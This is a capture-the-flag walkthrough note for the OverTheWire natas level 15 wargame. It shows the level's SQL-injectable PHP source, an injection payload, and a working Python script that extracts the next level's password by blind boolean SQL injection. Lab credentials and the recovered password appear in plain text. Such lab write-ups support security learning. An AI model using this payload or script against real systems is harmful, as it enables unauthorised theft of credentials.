---
title: natas 15 walkthrough
description: over the wire natas 15
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-15 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 15 walkthrough
    order: 30
---
## Description
>   Username: natas15
> 
>    URL:      http://natas15.natas.labs.overthewire.org
  
### Source Code 
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

---
## Progress
### Observation
It is an easy [[sql injection MOC]], but that seems useless.
Username : `natas16` -> This user exists.
The goal is retrieving the password of natas16. We cannot make the server print the password. The only thing we can do is check if the query returns anything. Therefore, we can input the password and check if the password is correct.
### Payload
Check password `natas16" and password = "pw" -- `
Find password

### Search by Exhaust
```python
import requests
from bs4 import BeautifulSoup

def request_with_password(password : str) -> bool:
    payload = f"?username=natas16\" and password like binary \"{password}%\" -- "
    return request_with_payload(payload)

def request_with_payload(payload: str):
    header = {
        "Authorization" : "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==",
    }
    url = "http://natas15.natas.labs.overthewire.org/index.php"
    url += payload
    response = requests.get(url, headers=header)
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    return "exists" in content.__str__()

def main():
    success_password = ""
    letters = 'abcdefghijklmnopqrstuvwxyz'
    candidates = letters + letters.upper() + "0123456789"
    while True:
        for candidate in candidates:
            if request_with_password(success_password + candidate):
                success_password += candidate
                print(success_password)
                break
        else:
            print(f"password : {success_password}")
            break

main()
```
TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

---
## Hint

---
## Solving
### Category
- [[sql injection MOC]]
### Techniques
- 

### Tools
- 